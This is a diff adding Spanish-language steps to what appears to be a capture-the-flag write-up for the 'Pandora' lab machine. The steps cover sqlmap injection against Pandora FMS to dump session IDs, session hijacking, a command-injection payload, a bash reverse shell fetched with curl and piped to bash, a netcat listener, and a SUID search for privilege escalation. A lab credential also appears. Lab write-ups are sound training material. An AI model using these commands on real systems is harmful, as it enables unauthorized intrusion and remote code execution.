@@ -101,6 +101,78 @@ Necesitaremos agregar una entrada para nuestro proxy en la sección ProxyList en
 nano /etc/proxychains4.con
 socks5 127.0.0.1 9090 daniel HotelBabylon23
 ```
+Ahora utilizaremos el sqlmap para hacer el escaner.
+```
+proxychains sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" --current-db
+```
+Obtenemos la lista "tables"
+```
+proxychains sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
+```
+Ahora con la tabla "sessions_php" sacamos los "session_id"
+```
+proxychains sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -T tsessions_php --dump
+```
+
+(todo esto también podemos utilizar una url si la hemos añadido al dns)
+
+```
+echo "ip pandora.panda.htb" | sudo tee -a /etc/hosts
+```
+Gracias a esto conseguimos las cookies de sesion en mi caso "g4e01qdgk36mfdh90hvcc54umq" y las añadimos al navegador.
+
+Nos conseguimos meter dentro de la cuenta de Matt y vamos a explorar dentro.
+
+Nos damos cuenta que no tenemos privilegios ni podemos hacer gran cosa, e intentaremos hacer una ejecución de código para conectarnos por una shell.
+
+Para coger las Request dentro de BurpSuite deberemos configurar el Sock Proxy dentro de "User options"
+
+Cuando consigamos el request de "events" lo pasaremos a post y le meteremos este payload .
+```
+page=include%2fajax%2fevents&perform_event_response=10000000&target=whoami&response_id=1
+```
+y como veremos nos respondera el "whoami" como "matt"
+
+Ahora crearemos una shell en nuestro equipo y agregaremos a la request para que lo descarge 
+```
+bash -i >& /dev/tcp/ip/1337 0>&1
+
+python3 -m http.server 80
+
+```
+y desde el burp suite haremos el curl para descargar
+```
+curl+ip:80/shell.sh|bash
+```
+```
+sudo nc -lvnp 1337
+```
+Gracias a esto conseguimos la primera flag de usuario
+
+## PRIVILEGE ESCALATION
+
+Buscaremos para empezar los archivos que tenemos permisos para modificar
+
+```
+ find / -perm -4000 2>/dev/null
+```
+Nos encontramos con un pandora backup vemos que es 
+```
+ ls -al /usr/bin/pandora_backup
+```
+Si probamos a iniciar el back_up nos da un error
+ ```
+ /usr/bin/pandora_backup
+```
+Podemos probar rompiendo las restriciones de la shel
+```
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+```
+```
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+
 
 
 
